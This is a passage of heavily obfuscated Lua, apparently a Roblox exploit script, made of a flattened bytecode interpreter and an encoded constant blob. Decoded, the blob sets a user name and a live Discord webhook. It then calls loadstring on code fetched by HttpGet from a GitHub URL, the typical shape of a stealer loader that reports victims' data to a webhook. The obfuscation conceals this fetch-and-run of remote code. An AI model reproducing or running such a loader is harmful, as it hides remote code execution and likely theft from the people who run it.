																				end
																			end
																		end
																		if (v86 == 3) then
																			return v14(v88);
																		end
																		v120 = 1;
																	end
																	if (v120 == 1) then
																		if ((501 - (458 + 41)) == v86) then
																			local v132 = 0;
																			while true do
																				if (v132 == 1) then
																					v86 = 3;
																					break;
																				end
																				if (v132 == 0) then
																					v88 = {};
																					for v156 = 1100 - (15 + 27 + (2607 - ((1956 - 835) + (674 - 245)))), #v87 do
																						v88[v156] = v10(v9(v11(v87, v156, v156)));
																					end
																					v132 = 1;
																				end
																			end
																		end
																		if (v86 == 1) then
																			local v133 = 0;
																			while true do
																				if (v133 == 0) then
																					v87 = v11(v30, v39, (v39 + v65) - (1 - 0));
																					v39 = v39 + v65;
																					v133 = 1;
																				end
																				if (1 == v133) then
																					v86 = 2;
																					break;
																				end
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
													end
												end;
												v47 = v44;
												v56 = 2;
											end
											if (v56 == 0) then
												v45 = function()
													local v89 = 0;
													local v90;
													local v91;
													local v92;
													local v93;
													local v94;
													local v95;
													local v96;
													while true do
														if (v89 == 0) then
															v90 = 0;
															v91 = nil;
															v89 = 1;
														end
														if (2 == v89) then
															v94 = nil;
															v95 = nil;
															v89 = 3;
														end
														if (v89 == 3) then
															v96 = nil;
															while true do
																local v121 = 0;
																while true do
																	if (v121 == 0) then
																		if (v90 == 1) then
																			local v134 = 0;
																			while true do
																				if (v134 == 0) then
																					v93 = ((292 + 521) - (111 + (1881 - 1180))) + (0 - 0);
																					v94 = (v41(v92, (1497 - 544) - (260 + (1551 - 859)), 1226 - ((3241 - 2390) + (1165 - 810))) * (((2 + 0) - (0 - (54 - (15 + 39)))) ^ (22 + 7 + 1 + 2))) + v91;
																					v134 = 1;
																				end
																				if (v134 == 1) then
																					v90 = 4 - 2;
																					break;
																				end
																			end
																		end
																		if (v90 == (2 + 1)) then
																			local v135 = 0;
																			while true do
																				if (v135 == 0) then
																					if (v95 == (1815 - (1763 + 52))) then
																						if (v94 == ((4557 - 2685) - (625 + 212 + 1035))) then
																							return v96 * ((1278 - (66 + 82)) - (505 + 625));
																						else
																							local v174 = 0;
																							local v175;
																							while true do
																								if (v174 == 0) then
																									v175 = 0;
																									while true do
																										if (v175 == 0) then
																											v95 = 1368 - (149 + 209 + 326 + 683);
																											v93 = ((3988 - 2708) - (313 + 151 + 8)) - (116 + (1269 - (1327 - (533 + 217))));
																											break;
																										end
																									end
																									break;
																								end
																							end
																						end
																					elseif (v95 == (1288 + 759)) then
																						return ((v94 == ((264 - ((77 - 43) + (578 - (251 + 97)))) - (0 + 0))) and (v96 * ((((1053 - 474) - (156 + 422)) - (0 - 0)) / (0 + 0)))) or (v96 * NaN);
																					end
																					return v16(v96, v95 - ((1130 - ((1200 - (990 + 149)) + 929)) + (4274 - 3391))) * (v93 + (v94 / ((40 - (25 + (38 - 25))) ^ (77 - (1 + 24)))));
																				end
																			end
																		end
																		v121 = 1;
																	end
																	if (1 == v121) then
																		if (v90 == 2) then
																			local v136 = 0;
																			while true do
																				if (v136 == 1) then
																					v90 = 5 - 2;
																					break;
																				end
																				if (0 == v136) then
																					v95 = v41(v92, (28 + 9) - (12 + 4), (1042 - (177 + 235)) - (213 + (1206 - (993 + 133)) + (2266 - (1115 + 845))));
																					v96 = ((v41(v92, 1333 - ((4634 - 3401) + (1148 - (541 + 539)))) == ((673 + 632) - (68 + (416 - 258) + (1500 - 422)))) and -(824 - ((1004 - (207 + 206)) + 232))) or (1 + 0);
																					v136 = 1;
																				end
																			end
																		end
																		if (v90 == 0) then
																			local v137 = 0;
																			while true do
																				if (v137 == 1) then
																					v90 = 1;
																					break;
																				end
																				if (v137 == 0) then
																					v91 = v44();
																					v92 = v44();
																					v137 = 1;
																				end
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
														if (v89 == 1) then
															v92 = nil;
															v93 = nil;
															v89 = 2;
														end
													end
												end;
												v46 = nil;
												v56 = 1;
											end
											if (v56 == 2) then
												v38 = 4;
												break;
											end
										end
									end
									break;
								end
								if (1 == v52) then
									if (v38 == 0) then
										local v57 = 0;
										while true do
											if (v57 == 1) then
												v30 = v12(v11(v30, 595 - (288 + 302)), v7("\251\155", "\213\181\19\156\91\222\20"), function(v66)
													if (v9(v66, 4 - (743 - (290 + 451))) == (211 - 132)) then
														local v111 = 0;
														local v112;
														while true do
															if (v111 == 0) then
																v112 = 0;
																while true do
																	if (v112 == 0) then
																		local v125 = 0;
																		while true do
																			if (v125 == 0) then
																				v40 = v8(v11(v66, 1 - 0, 2 - 1));
																				return "";
																			end
																		end
																	end
																end
																break;
															end
														end
													else
														local v113 = 0;
														local v114;
														local v115;
														while true do
															if (v113 == 1) then
																while true do
																	if (0 == v114) then
																		v115 = v10(v8(v66, 3 + 11 + 2));
																		if v40 then
																			local v142 = 0;
																			local v143;
																			local v144;
																			while true do
																				if (v142 == 1) then
																					while true do
																						local v173 = 0;
																						while true do
																							if (v173 == 0) then
																								if (v143 == 1) then
																									return v144;
																								end
																								if (v143 == 0) then
																									local v179 = 0;
																									while true do
																										if (0 == v179) then
																											v144 = v13(v115, v40);
																											v40 = nil;
																											v179 = 1;
																										end
																										if (v179 == 1) then
																											v143 = 1;
																											break;
																										end
																									end
																								end
																								break;
																							end
																						end
																					end
																					break;
																				end
																				if (v142 == 0) then
																					v143 = 0;
																					v144 = nil;
																					v142 = 1;
																				end
																			end
																		else
																			return v115;
																		end
																		break;
																	end
																end
																break;
															end
															if (v113 == 0) then
																v114 = 0;
																v115 = nil;
																v113 = 1;
															end
														end
													end
												end);
												v41 = nil;
												v57 = 2;
											end
											if (v57 == 0) then
												v39 = 1 + (0 - 0);
												v40 = nil;
												v57 = 1;
											end
											if (v57 == 2) then
												v38 = 1;
												break;
											end
										end
									end
									if (v38 == 4) then
										local v58 = 0;
										while true do
											if (v58 == 0) then
												v48 = nil;
												v48 = function(...)
													return {...}, v20("#", ...);
												end;
												v58 = 1;
											end
											if (1 == v58) then
												v49 = nil;
												v49 = function()
													local v97 = 0;
													local v98;
													local v99;
													local v100;
													local v101;
													local v102;
													local v103;
													local v104;
													while true do
														if (1 == v97) then
															v100 = nil;
															v101 = nil;
															v97 = 2;
														end
														if (v97 == 0) then
															v98 = 0;
															v99 = nil;
															v97 = 1;
														end
														if (v97 == 2) then
															v102 = nil;
															v103 = nil;
															v97 = 3;
														end
														if (3 == v97) then
															v104 = nil;
															while true do
																local v122 = 0;
																while true do
																	if (v122 == 1) then
																		if (v98 == 0) then
																			local v138 = 0;
																			while true do
																				if (v138 == 1) then
																					v101 = {};
																					v98 = 1;
																					break;
																				end
																				if (v138 == 0) then
																					v99 = {};
																					v100 = {};
																					v138 = 1;
																				end
																			end
																		end
																		if (3 == v98) then
																			local v139 = 0;
																			while true do
																				if (0 == v139) then
																					for v158 = 1 + 0, v44() do
																						v100[v158 - 1] = v49();
																					end
																					for v160 = 2 - 1, v44() do
																						v101[v160] = v44();
																					end
																					v139 = 1;
																				end
																				if (v139 == 1) then
																					return v102;
																				end
																			end
																		end
																		break;
																	end
																	if (v122 == 0) then
																		if (v98 == 1) then
																			local v140 = 0;
																			while true do
																				if (v140 == 1) then
																					v104 = {};
																					v98 = 2;
																					break;
																				end
																				if (v140 == 0) then
																					v102 = {v99,v100,nil,v101};
																					v103 = v44();
																					v140 = 1;
																				end
																			end
																		end
																		if (v98 == 2) then
																			local v141 = 0;
																			while true do
																				if (v141 == 0) then
																					for v162 = (2 - 1) - (0 + 0), v103 do
																						local v163 = 0;
																						local v164;
																						local v165;
																						local v166;
																						while true do
																							if (v163 == 1) then
																								v166 = nil;
																								while true do
																									if (v164 == 0) then
																										local v180 = 0;
																										while true do
																											if (v180 == 0) then
																												v165 = v42();
																												v166 = nil;
																												v180 = 1;
																											end
																											if (v180 == 1) then
																												v164 = 1;
																												break;
																											end
																										end
																									end
																									if (v164 == 1) then
																										if (v165 == (1 + 0)) then
																											v166 = v42() ~= ((0 + 0) - 0);
																										elseif (v165 == (1353 - ((6211 - 4871) + (25 - 14)))) then
																											v166 = v45();
																										elseif (v165 == ((1543 - 855) - (506 + 179))) then
																											v166 = v46();
																										end
																										v104[v162] = v166;
																										break;
																									end
																								end
																								break;
																							end
																							if (v163 == 0) then
																								v164 = 0;
																								v165 = nil;
																								v163 = 1;
																							end
																						end
																					end
																					v102[11 - (83 - (62 + 13))] = v42();
																					v141 = 1;
																				end
																				if (v141 == 1) then
																					for v167 = (1905 - (1701 + 202)) - (1 + 0), v44() do
																						local v168 = 0;
																						local v169;
																						local v170;
																						while true do
																							if (0 == v168) then
																								v169 = 0;
																								v170 = nil;
																								v168 = 1;
																							end
																							if (v168 == 1) then
																								while true do
																									if (0 == v169) then
																										v170 = v42();
																										if (v41(v170, 1 + 0 + 0 + 0, 1 - 0) == (785 - (716 + 69))) then
																											local v185 = 0;
																											local v186;
																											local v187;
																											local v188;
																											local v189;
																											while true do
																												if (v185 == 1) then
																													v188 = nil;
																													v189 = nil;
																													v185 = 2;
																												end
																												if (v185 == 2) then
																													while true do
																														if (3 == v186) then
																															if (v41(v188, 1234 - (139 + 209 + 883), 160 - (109 + 48)) == (1300 - (1015 + 284))) then
																																v189[(4270 - 2293) - ((1991 - 1066) + (1977 - 929))] = v104[v189[4 + 0]];
																															end
																															v99[v167] = v189;
																															break;
																														end
																														if (v186 == 0) then
																															local v205 = 0;
																															while true do
																																if (v205 == 1) then
																																	v186 = 1;
																																	break;
																																end
																																if (v205 == 0) then
																																	v187 = v41(v170, 2 + 0, 645 - (396 + 246));
																																	v188 = v41(v170, (1641 - 1042) - (335 + 260), 4 + 2);
																																	v205 = 1;
																																end
																															end
																														end
																														if (v186 == 1) then
																															local v206 = 0;
																															while true do
																																if (v206 == 0) then
																																	v189 = {v43(),v43(),nil,nil};
																																	if (v187 == ((487 - (79 + 408)) - (0 + 0))) then
																																		local v214 = 0;
																																		local v215;
																																		while true do
																																			if (v214 == 0) then
																																				v215 = 0;
																																				while true do
																																					if (v215 == 0) then
																																						v189[(14 - 10) - (2 - 1)] = v43();
																																						v189[1747 - ((3391 - 1828) + (1850 - (152 + 1518)))] = v43();
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	elseif (v187 == (1 + 0)) then
																																		v189[(2 - 0) + 1] = v44();
																																	elseif (v187 == (5 - 3)) then
																																		v189[(41 - 27) - (2 + 7 + 1 + 1)] = v44() - (((3 - 1) - 0) ^ (35 - (33 - 14)));
																																	elseif (v187 == (1 + (5 - 3))) then
																																		local v227 = 0;
																																		local v228;
																																		while true do
																																			if (v227 == 0) then
																																				v228 = 0;
																																				while true do
																																					if (0 == v228) then
																																						v189[10 - 7] = v44() - (((2 - 1) + 1) ^ 16);
																																						v189[4] = v43();
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	end
																																	v206 = 1;
																																end
																																if (v206 == 1) then
																																	v186 = 2;
																																	break;
																																end
																															end
																														end
																														if (v186 == 2) then
																															local v207 = 0;
																															while true do
																																if (v207 == 1) then
																																	v186 = 3;
																																	break;
																																end
																																if (v207 == 0) then
																																	if (v41(v188, (3 - 2) + (0 - 0), 1) == ((1 - 0) + 0)) then
																																		v189[2] = v104[v189[2]];
																																	end
																																	if (v41(v188, 1 + 1, (2317 - (783 + 433)) - ((1256 - 393) + 111 + 125)) == (2 - (3 - 2))) then
																																		v189[5 - 2] = v104[v189[3]];
																																	end
																																	v207 = 1;
																																end
																															end
																														end
																													end
																													break;
																												end
																												if (v185 == 0) then
																													v186 = 0;
																													v187 = nil;
																													v185 = 1;
																												end
																											end
																										end
																										break;
																									end
																								end
																								break;
																							end
																						end
																					end
																					v98 = 3;
																					break;
																				end
																			end
																		end
																		v122 = 1;
																	end
																end
															end
															break;
														end
													end
												end;
												v58 = 2;
											end
											if (v58 == 2) then
												v38 = 5;
												break;
											end
										end
									end
									v52 = 2;
								end
							end
						end
						break;
					end
					if (v37 == 3) then
						v47 = nil;
						v48 = nil;
						v49 = nil;
						v37 = 4;
					end
					if (v37 == 1) then
						v41 = nil;
						v42 = nil;
						v43 = nil;
						v37 = 2;
					end
				end
			end;
			v23("LOL!133O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403083O00557365724E616D65030A3O008B723C37CA469069303203063O00CF1B5156A12703073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3130393230362O30382O3938363331383431362F5453596D694539694D35314F2D632O5374424A7441374753456674645476737477685978436570773961417649506D7151793731787533492D6C41425F75434963504E73030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033A3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F6B34662O742F52692O7A2F6D61696E2F4D61696E2E6C756100253O0012153O00013O0020105O0002001215000100013O002010000100010003001215000200013O002010000200020004001215000300053O00060F0003000A000100010004083O000A0001001215000300063O002010000400030007001215000500083O002010000500050009001215000600083O00201000060006000A00060A00073O000100062O000E3O00064O000E8O000E3O00044O000E3O00014O000E3O00024O000E3O00054O000E000800073O00121C0009000C3O00121C000A000D4O000C0008000A000200122O0008000B3O00121C0008000F3O00122O0008000E3O001215000800103O001215000900113O00201B00090009001200121C000B00134O00010009000B4O001100083O00022O00120008000100012O00063O00013O00013O00023O00026O00F03F026O00704002284O000300025O00121C000300014O000200045O00121C000500013O00040B0003002300012O000D00076O000E000800024O000D000900014O000D000A00024O000D000B00034O000D000C00044O000E000D6O000E000E00063O002018000F000600012O0001000C000F4O0011000B3O00022O000D000C00034O000D000D00044O000E000E00013O002016000F000600012O0002001000014O0019000F000F0010001014000F0001000F0020160010000600012O0002001100014O00190010001000110010140010000100100020180010001000012O0001000D00104O0009000C6O0011000A3O0002002017000A000A00022O00130009000A4O001A00073O00010004070003000500012O000D000300054O000E000400024O0005000300044O000400036O00063O00017O00283O00093O000A3O000A3O000A3O000A3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000A3O000D3O000D3O000D3O000D3O000E3O00253O00013O00013O00023O00023O00033O00033O00043O00043O00043O00043O00053O00063O00063O00073O00073O000E3O000E3O000E3O000E3O000E3O000E3O000E3O000F3O000F3O000F3O000F3O000F3O00103O00103O00113O00113O00113O00113O00113O00113O00113O00113O00", v17(), ...);
			break;
		end
		if (v24 == 0) then
			v0 = string.char;
			v1 = string.byte;
			v2 = string.sub;
			v24 = 1;
		end
		if (v24 == 7) then
			v20 = _G[v7("\61\199\219\65\136\234", "\78\162\183\36\235\158\70")];
			v21 = _G[v7("\236\58\35\228\242\242", "\153\84\83\133\145")] or _G[v7("\50\213\8\241\76", "\70\180\106\157\41")][v7("\49\29\190\248\138\95", "\68\115\206\153\233\52")];
			v22 = _G[v7("\253\211\25\29\246\86\232\37", "\137\188\119\104\155\52\141\87")];
			v24 = 8;
		end
	end
end
